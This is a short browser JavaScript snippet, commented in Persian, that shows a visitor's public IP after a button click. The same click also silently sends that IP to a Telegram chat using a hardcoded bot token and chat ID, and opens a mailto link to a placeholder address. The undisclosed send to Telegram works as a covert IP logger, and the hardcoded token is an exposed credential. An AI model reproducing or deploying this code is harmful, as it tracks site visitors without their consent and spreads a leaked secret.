document.getElementById('getIpButton').addEventListener('click', async () => {
    try {
        // دریافت آدرس IP کاربر
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const userIp = data.ip;

        // نمایش IP در صفحه
        document.getElementById('ipDisplay').innerText = `آدرس IP شما: ${userIp}`;

        // ارسال آدرس IP به تلگرام
        const telegramBotToken = '6999716266:AAFC7En0WCUoI4yMyOsKnT1ssvS3rmCbHP8';
        const telegramChatId = '-1002419512530';
        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${userIp}`;
        
        await fetch(telegramApiUrl);

        // ارسال آدرس IP به ایمیل (از طریق سرویس SMTP یا API)
        const email = 'YOUR_EMAIL@example.com'; // ایمیل مورد نظر
        const subject = 'آدرس IP کاربر';
        const body = `آدرس IP شما: ${userIp}`;
        window.open(`mailto:${email}?subject=${subject}&body=${body}`);

    } catch (error) {
        console.error('Error:', error);
    }
});
